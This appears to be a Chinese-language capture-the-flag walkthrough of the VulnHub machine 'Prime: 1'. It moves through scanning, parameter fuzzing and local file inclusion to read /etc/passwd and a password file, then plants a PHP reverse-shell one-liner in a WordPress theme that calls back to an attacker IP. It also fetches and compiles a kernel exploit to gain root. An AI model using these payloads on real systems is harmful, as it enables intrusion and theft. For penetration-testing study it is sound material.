# Prime: 1

2024-6-2 https://www.vulnhub.com/entry/prime-1,358/

difficulty: medium

## IP

192.168.10.189

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8dc52023ab10cadee2fbe5cd4d2d4d72 (RSA)
|   256 949cf86f5cf14c11957f0a2c3476500b (ECDSA)
|_  256 4bf6f125b61326d4fc9eb0729ff46968 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: HacknPentest
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

虚拟机启动后，看到界面上有一个用户名 victor

http://192.168.10.189/ 主页上是一个图片，源代码中也没有可用信息。

使用 gobuster 进行扫描：

```
gobuster -t 64 dir -u http://192.168.10.189/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.10.189/image.php            (Status: 200) [Size: 147]
http://192.168.10.189/wordpress            (Status: 301) [Size: 320] [--> http://192.168.10.189/wordpress/]
http://192.168.10.189/index.php            (Status: 200) [Size: 136]
http://192.168.10.189/dev                  (Status: 200) [Size: 131]
http://192.168.10.189/javascript           (Status: 301) [Size: 321] [--> http://192.168.10.189/javascript/]
http://192.168.10.189/secret.txt           (Status: 200) [Size: 412]
```

看到有一个 wordpress 目录，应该是 wp cms。

先看看 /secret.txt 中有什么：

```
Looks like you have got some secrets.

Ok I just want to do some help to you.

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web

//see the location.txt and you will get your next move//
```

提示多 FUZZ，并且有一个 location.txt，访问 http://192.168.10.189/location.txt 是 404

http://192.168.10.189/image.php 和 http://192.168.10.189/index.php 显示的内容一致。

http://192.168.10.189/dev 显示:

```
hello,
now you are at level 0 stage.
In real life pentesting we should use our tools to dig on a web very hard.
Happy hacking.
```

没什么用。

看看 http://192.168.10.189/wordpress 这个 wordpress 吧，使用 wpscan 进行枚举：

```
wpscan --url http://192.168.10.189/wordpress/ -e

发现一个用户名  victor
```

使用 cewl 收集 cms 信息作为密码，使用 wpscan 进行爆破，但是没有找到 victor 的密码：

```
cewl -d 5 http://192.168.10.189/wordpress/ -w pass.txt

wpscan --url http://192.168.10.189/wordpress/ -P pass.txt -t 10
```

根据 /secret.txt 中的提示，对 image.php 和 index.php 进行参数爆破：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.10.189/image.php?FUZZ=111 -fs 147

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://192.168.10.189/index.php?FUZZ=1111' -fs 136
```

在 /index.ph 中发现 file 参数，继续进行利用,根据参数名意思，有可能是 LFI 或者是文件上传：

```
curl 'http://192.168.10.189/index.php?file=/etc/passwd'

显示结果: Do something better you are digging wrong file
```

尝试读取其他文件看看是否有能读取的:

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.10.189/index.php?file=FUZZ -fs 0
```

根据前面的提示，还有一个 location.txt，让我们包含这个文件看看能不能读出下一步提示信息：

```
curl 'http://192.168.10.189/index.php?file=location.txt'

ok well Now you reah at the exact parameter

Now dig some more for next one
use 'secrettier360' parameter on some other php page for more fun.
```

得到了一个参数提示 secrettier360 ，在另外一个 php 页面，估计就是 image.php，继续尝试 LFI：

```
curl 'http://192.168.10.189/image.php?secrettier360=/etc/passwd'

root:x:0:0:root:/root:/bin/bash
...
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

发现 3 个用户 root victor saket。 saket 还有一个提示: find password.txt file in my directory /home/saket， 尝试利用 LFI 读取。

尝试读取 /home/saket/password.txt 这个文件, 找到了一个密码 follow_the_ippsec：

```
curl 'http://192.168.10.189/image.php?secrettier360=/home/saket/password.txt'

follow_the_ippsec
```

尝试用密码 follow_the_ippsec 和 用户名 victor 登陆 wordpress。登陆后，发现 victor 是管理员权限，寻找可以写入 web shell 的功能点，media upload 、theme add、 plugin add 这几个地方上传后，都显示无写权限，在 theme editor 进行查找可写的页面，在 Twenty Nineteen 这个 theme 下，只有一个可以写的文件 secret.php 应该是靶机设计者给我们留下的 web shell 入口，将 web shell 写入到其中，在 kali 上进行监听，访问 theme 对应页面，得到反弹的 shell：

```
Twenty Nineteen: secret.php

<?php system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.10.3/8888 0>&1'");?>
```

访问 php 触发反弹：

```
curl http://192.168.10.189/wordpress/wp-content/themes/twentynineteen/secret.php

nc -lvnp 8888

www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

获得 user flag:

```
www-data@ubuntu:/home/saket$ ls
enc  password.txt  user.txt
www-data@ubuntu:/home/saket$ cat user.txt
af3c658dcf9d7190da3153519c003456
```

尝试进行系统枚举，找到提权点。

```
cat /var/www/html/wordpress/wp-config.php'

define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'yourpasswordhere' );
define( 'DB_HOST', 'localhost' );
```

尝试使用得到的 password ssh 登陆上面得到的 3 个用户，但是登陆不成功。

crontab、suid、getcap 等都没发现可利用点，sudo 发现内容：

```
(root) NOPASSWD: /home/saket/enc
```

但是执行时需要输入密码，输入上面得到的密码，也没有什么反应。

尝试使用内核提权 https://www.exploit-db.com/exploits/45010

```
wget http://192.168.10.3/45010.c
gcc 45010.c -o 45010 && ./45010

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls -al
total 92
drwx------  5 root root  4096 Aug 31  2019 .
drwxr-xr-x 24 root root  4096 Aug 29  2019 ..
-rw-------  1 root root  8551 Sep  1  2019 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
drwx------  3 root root  4096 Aug 30  2019 .cache
-rw-------  1 root root   137 Aug 30  2019 .mysql_history
drwxr-xr-x  2 root root  4096 Aug 29  2019 .nano
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    66 Aug 31  2019 .selected_editor
-rwxr-xr-x  1 root root 14272 Aug 30  2019 enc
-rw-r--r--  1 root root   305 Aug 30  2019 enc.cpp
-rw-r--r--  1 root root   237 Aug 30  2019 enc.txt
-rw-r--r--  1 root root   123 Aug 30  2019 key.txt
-rw-r--r--  1 root root    33 Aug 30  2019 root.txt
-rw-r--r--  1 root root   805 Aug 30  2019 sql.py
-rwxr-xr-x  1 root root   442 Aug 31  2019 t.sh
drwxr-xr-x 10 root root  4096 Aug 30  2019 wfuzz
-rw-r--r--  1 root root   170 Aug 29  2019 wordpress.sql
# cat root.txt
b2b17036da1de94cfb024540a8e7075a
```

同时在/root 中，看到了 enc 的源码：

```
int main()
{
string s;
cout<<"enter password: ";
cin>>s;
if(s=="backup_password")
{
cout<<"good"<<endl;
system("/bin/cp /root/enc.txt /home/saket/enc.txt");
system("/bin/cp /root/key.txt /home/saket/key.txt");
}
return 0;
}
```

执行时需要输入的密码就是 backup_password，但是 enc.txt 和 key.txt 这 2 个 key 中的内容，不是 vitcim 和 root 的密码，没什么用。
